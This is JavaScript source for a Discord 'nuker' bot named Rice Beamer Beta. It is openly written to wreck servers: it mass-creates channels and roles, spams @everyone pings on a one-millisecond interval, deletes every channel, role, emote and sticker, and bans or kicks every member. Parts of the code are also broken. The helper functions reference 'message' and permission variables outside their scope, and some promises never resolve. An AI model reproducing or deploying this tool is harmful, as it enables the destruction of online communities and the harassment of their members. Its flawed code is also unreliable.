/**
 * Rice Beamer Beta
 * @author Riceblades11
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json");

nuker.on("ready", () => {
    console.clear();
    console.log(cyan(`


    ████  █████  ████ █████ █   █ █   █ █  █  █████ ████
    █   █   █   █     █     ██  █ █   █ █ █   █     █   █
    ████    █   █     ████  █ █ █ █   █ ██ █  ████  ████
    █   █   █   █     █     █  ██ █   █ █  █  █     █   █
    █   █ █████  ████ █████ █   █ █████ █   █ █████ █   █
    ▒▓▒░    ░░  ▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▓░░ ▒░▓   ▓
    ░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░ ░ ░  ░  ░
    ░░         ░░   ░    ░   ░  ░  ░  ░  ░  ░     ░   ░  ░
    ░        ░  ░      ░        ░     ░  ░   ░

                            Beta
                    Nuker: ${nuker.user.tag}
                    Prefix: ${prefix}
    `))
    nuker.user.setActivity("Rice Beamer Trolling", {
        type: "STREAMING",
        url: "https://www.twitch.tv/amouranth"
      });
});

nuker.on("messageCreate", (message) => {
  // Perms
  const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS");
  const banPerms = message.guild.me.permissions.has("BAN_MEMBERS");
  const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS");
  const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES");
  const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS");

  // Command name
  const command = message.content.match(new RegExp(`${prefix}(.*?) `))[1].toLowerCase();

  // Possible Args
  const args = message.content.split(" ").slice(1);
  const args1 = args[0]; // Used for amount
  const args2 = args[1]; // Naming things
  const args3 = args.slice(2).join(' '); // Other

  if (disableEveryone) {
    if (message.author.id != userID) {
      message.reply("You are not authorised to use any of this tools' commands.");
      return;
    }
  }

  switch (command) {
    // Help
    case "help": {
      const help = new MessageEmbed()
          .setDescription(`**Rice Beamer Beta ;**
      \n**Create Channels ;**
      ${prefix}cc [amount] (text) i.e \`${prefix}cc 5 test\`\n
      **Create Channels & Ping ;**
      ${prefix}trol [amount] (text), {message} i.e \`${prefix}trol 5 test, testing\`\n
      **Create Roles ;**
      ${prefix}cr [amount] (text) i.e \`${prefix}cr 5 test\`\n
      **delete channels ;**
      ${prefix}dc\n
      **delete roles ;**
      ${prefix}dr\n
      **delete emotes ;**
      ${prefix}de\n
      **delete stickers ;**
      ${prefix}ds\n
      **mass kick ;**
      ${prefix}mk\n
      **mass ban ;**
      ${prefix}mb
      More Coming Soon!
      Made By: \`Riceblades11\`\n Discord: \`Rice#0404\`\n
      `)
          .setFooter(`© Rice Beamer Beta`, 'https://st2.depositphotos.com/1864495/7208/i/600/depositphotos_72082789-stock-photo-trollface-dark-spectacled-internet-troll.jpg', 'https://sullylovesmelons.xyz')
          .setColor(0x00FFFF)
          .setAuthor('Riceblades11', 'https://st2.depositphotos.com/1864495/7208/i/600/depositphotos_72082789-stock-photo-trollface-dark-spectacled-internet-troll.jpg', 'https://sullylovesmelons.xyz')
          .setThumbnail("https://media.istockphoto.com/illustrations/trollface-internet-troll-3d-illustration-illustration-id499870283?k=20&m=499870283&s=612x612&w=0&h=_oy1OzNBqcJhYIQmJeGxO322DPlzhupXlSRgL6u9Pwg=")
          .setTimestamp(Date.now());

      message.channel.send({embeds: [help]})
      break;
    }

    // Mass Channels
    case "cc": {
      MassChannels(args1, args2).catch((err) => {
          message.reply(err);
      });
      break;
    }

    // Delete all channels
    case "dc": {
      DelAllChannels().catch((err) => {
          message.reply(err);
      });
      break;
    }

    // Mass Channels and Ping
    case "trol": {
      MassChnPing(args1, args2, args3).catch((err) => {
          message.reply(err);
      });
      break;
    }

    // Mass Roles
    case "cr": {
      MassRoles(args1, args2).catch((err) => {
          message.reply(err);
      });
      break;
    }

    // Delete all Roles
    case "dr": {
      DelAllRoles().catch((err) => {
          message.reply(err);
      });
      break;
    }

    // Delete all Stickers
    case "ds": {
      DelAllStickers().catch((err) => {
          message.reply(err);
      });
      break;
    }

    // Delete all Emotes
    case "de": {
      DelAllEmotes().catch((err) => {
          message.reply(err);
      });
      break;
    }

    // Mass Ban
    case "mb": {
      BanAll().catch((err) => {
          message.reply(err);
      });
      break;
    }

    // Mass Kick
    case "mk": {
      KickAll().catch((err) => {
          message.reply(err);
      });
      break;
    }

    //Unknown command
    default: {
      message.reply(`Unrecognized command ${command}.`);
      break;
    }
  }
});

// Nuking Functions

/**
 * Excessive amount of channels
 * @param {number} amount Amount of channels to mass create
 * @param {string} channelName Name of channel
 */
function MassChannels(amount, channelName) {
    return new Promise((resolve, reject) => {
        if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
        if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
        if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
        if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size === 500) break;
            if (!channelName) {
                message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
            } else {
                message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
            }
        }
        resolve();
    });
}

/**
 * Excessive amount of channels and mentions
 * @param {number} amount Amount of channels to mass create
 * @param {string} channelName Name of channel
 * @param {string} pingMessage Message to be sent when everyone is mentioned
 */
function MassChnPing(amount, channelName, pingMessage) {
    return new Promise((resolve, reject) => {
        if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
        if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
        if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
        if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
        if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size === 500) break;
            if (!channelName) {
                message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                    setInterval(() => {
                        ch.send("@everyone " + pingMessage);
                    }, 1);
                });
            } else {
                message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                    setInterval(() => {
                        ch.send("@everyone " + pingMessage);
                    }, 1); // literally not possible
                });
            }
        }
        resolve();
    });
}

/**
 * Deletes all channels in a guild
 */
function DelAllChannels() {
    return new Promise((resolve, reject) => {
        if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
        message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        resolve();
    });
}

/**
 * Excessive amount of roles
 * @param {number} amount Amount of roles
 * @param {string} roleName Role name
 */
function MassRoles(amount, roleName) {
    return new Promise((resolve, reject) => {
        if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
        if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
        if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
        for (let i = 0; i <= amount; i++) {
            if (message.guild.roles.cache.size === 250) break;
            if (!roleName) {
                message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
            } else {
                message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
            }
        }
    })
}

/**
 * Deletes all roles
 */
function DelAllRoles() {
    return new Promise((resolve, reject) => {
        if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
        message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
    });
}

/**
 * Deletes all emotes
 */
function DelAllEmotes() {
    return new Promise((resolve, reject) => {
        if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
        message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
    });
}

/**
 * Deletes all stickers
 */
function DelAllStickers() {
    return new Promise((resolve, reject) => {
        if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
        message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
    });
}

/**
 * Ban all guild Members
 */
function BanAll() {
    return new Promise((resolve, reject) => {
        if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
        let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
        message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
            setTimeout(() => {
                msg.edit("Banning...");
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i];
                    const member = message.guild.members.cache.get(user);
                    member.ban().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
                }
            }, 2000);
        })
    })
}

/**
 * Kick all guild Members
 */
function KickAll() {
    return new Promise((resolve, reject) => {
        if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
        let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
        message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
            setTimeout(() => {
                msg.edit("Banning...");
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i];
                    const member = message.guild.members.cache.get(user);
                    member.kick().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
                }
            }, 2000);
        })
    })
}

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
